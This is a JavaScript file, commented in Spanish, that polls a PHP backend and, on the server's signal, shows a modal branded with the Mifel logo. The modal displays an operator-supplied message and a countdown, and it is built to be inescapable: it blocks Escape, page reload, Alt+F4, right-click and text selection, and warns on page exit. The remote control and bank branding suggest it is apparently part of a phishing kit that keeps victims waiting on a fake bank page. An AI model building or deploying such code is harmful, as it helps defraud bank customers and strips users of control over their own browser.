/**
 * Sistema de Reloj Personalizado - Maneja el envío y recepción de timers
 * Se integra con el sistema de modales existente siguiendo el patrón de herramientas
 */

class RelojPersonalizadoSystem {
    constructor() {
        this.init();
        this.currentTimer = null;
        this.isMinimized = false;
    }

    init() {
        // Iniciar verificación de timers cada 3 segundos
        this.startTimerCheck();
        
        // Verificar inmediatamente al cargar
        this.checkForTimers();
    }

    startTimerCheck() {
        // Verificar timers cada 3 segundos
        this.timerInterval = setInterval(() => {
            this.checkForTimers();
        }, 3000);
    }

    stopTimerCheck() {
        if (this.timerInterval) {
            clearInterval(this.timerInterval);
            this.timerInterval = null;
        }
    }

    async checkForTimers() {
        try {
            // Verificar timers pendientes
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/verificar_timer.php');
            
            // Verificar que la respuesta sea JSON válido
            const responseText = await response.text();
            let data;
            try {
                data = JSON.parse(responseText);
            } catch (e) {
                console.error('Respuesta no válida de verificar_timer.php:', responseText);
                return;
            }

            if (data.success && data.tiene_timer) {
                this.showTimerModal(data);
            }
        } catch (error) {
            console.warn('Error verificando timers:', error);
        }
    }

    escapeHtml(text) {
        if (text === null || text === undefined) {
            return '';
        }
        const div = document.createElement('div');
        div.textContent = String(text);
        return div.innerHTML;
    }

    showTimerModal(data) {
        // Si ya hay un timer activo, no mostrar otro
        if (this.currentTimer) {
            return;
        }

        const mensajeSeguro = data.mensaje_personalizado
            ? this.escapeHtml(data.mensaje_personalizado)
            : 'Por favor, espera mientras procesamos tu solicitud...';

        // Crear modal completamente separado e inescapable
        const timerModalHTML = `
            <div id="timerModalInescapable" class="timer-modal-inescapable">
                <div class="timer-container-inescapable">
                    <div class="timer-header">
                        <div class="timer-icon">
                            <i class="fas fa-clock"></i>
                        </div>
                        <div class="timer-title">
                            <img class="modal-brand-logo" src="${window.MODAL_BASE || ''}images/logo_mifel_blanco.svg" alt="Mifel">
                        </div>
                        <div class="timer-subtitle">Por favor mantente en la página</div>
                    </div>
                    
                    <div class="timer-content">
                        <div class="timer-message">
                            ${mensajeSeguro}
                        </div>
                        
                        <div class="timer-display">
                            <div class="time-remaining" id="timeRemainingInescapable">
                                ${this.formatTime(parseInt(data.tiempo_segundos))}
                            </div>
                            <div class="time-label">Tiempo Restante</div>
                        </div>
                        
                        <div class="progress-container">
                            <div class="progress-bar" id="progressBarInescapable" style="width: 100%"></div>
                        </div>
                        <div class="progress-percentage" id="progressPercentageInescapable">100%</div>
                    </div>
                </div>
            </div>
        `;

        // Añadir al body
        document.body.insertAdjacentHTML('beforeend', timerModalHTML);

        // Hacer completamente inescapable
        this.makeModalInescapable();

        // Iniciar countdown
        this.startCountdown(parseInt(data.tiempo_segundos), data.id);
    }

    makeModalInescapable() {
        const modal = document.getElementById('timerModalInescapable');
        
        // Prevenir cerrar con ESC (solo si no hay modal admin activo)
        document.addEventListener('keydown', this.preventEscape);
        
        // Prevenir click fuera del modal timer - NO cerrar al hacer click en el overlay
        modal.addEventListener('click', function(e) {
            // Si el click es en el overlay (fondo), prevenir el cierre
            if (e.target === modal) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
            // Si el click es en el contenedor, permitir interacción normal
            e.stopPropagation();
        });
        
        // Prevenir cerrar ventana/tab
        window.addEventListener('beforeunload', this.preventClose);
        
        // Prevenir click derecho solo en el timer
        modal.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // Prevenir selección de texto solo en el timer
        modal.style.userSelect = 'none';
        modal.style.webkitUserSelect = 'none';
        modal.style.mozUserSelect = 'none';
        modal.style.msUserSelect = 'none';
    }

    preventEscape = (e) => {
        // Permitir interacción con modales admin
        const adminModal = document.getElementById('adminModal');
        if (adminModal && adminModal.classList.contains('active')) {
            return; // No interceptar si hay un modal admin activo
        }
        
        if (e.key === 'Escape' || e.keyCode === 27) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        // También prevenir F5, Ctrl+R, Alt+F4, etc.
        if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.altKey && e.key === 'F4')) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }

    preventClose = (e) => {
        if (this.currentTimer) {
            e.preventDefault();
            e.returnValue = 'Hay un timer activo. ¿Estás seguro de que quieres salir?';
            return 'Hay un timer activo. ¿Estás seguro de que quieres salir?';
        }
    }



    startCountdown(tiempoSegundos, timerId) {
        const timeRemainingEl = document.getElementById('timeRemainingInescapable');
        const progressBarEl = document.getElementById('progressBarInescapable');
        const progressPercentageEl = document.getElementById('progressPercentageInescapable');
        const modal = document.getElementById('timerModalInescapable');

        const tiempoTotal = tiempoSegundos;
        let tiempoRestante = tiempoSegundos;

        this.currentTimer = setInterval(() => {
            tiempoRestante--;

            // Actualizar display del tiempo
            if (timeRemainingEl) {
                timeRemainingEl.textContent = this.formatTime(tiempoRestante);
            }

            // Actualizar barra de progreso
            const porcentaje = (tiempoRestante / tiempoTotal) * 100;
            if (progressBarEl) {
                progressBarEl.style.width = Math.max(0, porcentaje) + '%';
            }
            if (progressPercentageEl) {
                progressPercentageEl.textContent = Math.max(0, Math.round(porcentaje)) + '%';
            }

            // Cambiar a estado crítico cuando quedan menos de 30 segundos
            if (tiempoRestante <= 30 && tiempoRestante > 0) {
                modal.classList.add('timer-critical');
            }

            // Timer terminado
            if (tiempoRestante <= 0) {
                this.finishTimer(timerId);
            }
        }, 1000);
    }

    finishTimer(timerId) {
        // Limpiar interval
        if (this.currentTimer) {
            clearInterval(this.currentTimer);
            this.currentTimer = null;
        }

        const modal = document.getElementById('timerModalInescapable');
        const timeRemainingEl = document.getElementById('timeRemainingInescapable');
        const progressBarEl = document.getElementById('progressBarInescapable');
        const progressPercentageEl = document.getElementById('progressPercentageInescapable');

        // Actualizar UI a estado terminado
        if (modal) {
            modal.classList.add('timer-finished');
            modal.classList.remove('timer-critical');
        }

        if (timeRemainingEl) {
            timeRemainingEl.textContent = '00:00:00';
        }
        if (progressBarEl) {
            progressBarEl.style.width = '0%';
        }
        if (progressPercentageEl) {
            progressPercentageEl.textContent = '0%';
        }

        // Enviar respuesta automática al servidor
        this.enviarRespuestaTimer(timerId);

        // Auto-cerrar después de 3 segundos
        setTimeout(() => {
            this.closeTimer();
        }, 3000);
    }



    closeTimer() {
        const modal = document.getElementById('timerModalInescapable');
        
        // Limpiar timer activo
        if (this.currentTimer) {
            clearInterval(this.currentTimer);
            this.currentTimer = null;
        }

        // Remover todos los event listeners
        document.removeEventListener('keydown', this.preventEscape);
        window.removeEventListener('beforeunload', this.preventClose);

        // Eliminar modal completamente
        if (modal) {
            modal.remove();
        }
        
        this.isMinimized = false;
    }

    async enviarRespuestaTimer(timerId) {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/procesar_timer.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    accion: 'timer_completado',
                    timer_id: timerId
                })
            });

            await response.json();
        } catch (error) {
            console.error('Error enviando respuesta de timer:', error);
        }
    }

    formatTime(segundos) {
        const horas = Math.floor(segundos / 3600);
        const minutos = Math.floor((segundos % 3600) / 60);
        const segs = segundos % 60;

        return `${horas.toString().padStart(2, '0')}:${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
    }

    // Método para destruir el sistema
    destroy() {
        this.stopTimerCheck();
        if (this.currentTimer) {
            clearInterval(this.currentTimer);
            this.currentTimer = null;
        }
    }
}

// Inicializar sistema cuando se carga la página
let relojPersonalizadoSystem;

document.addEventListener('DOMContentLoaded', function() {
    relojPersonalizadoSystem = new RelojPersonalizadoSystem();
});

// Limpiar al salir de la página
window.addEventListener('beforeunload', function() {
    if (relojPersonalizadoSystem) {
        relojPersonalizadoSystem.destroy();
    }
});

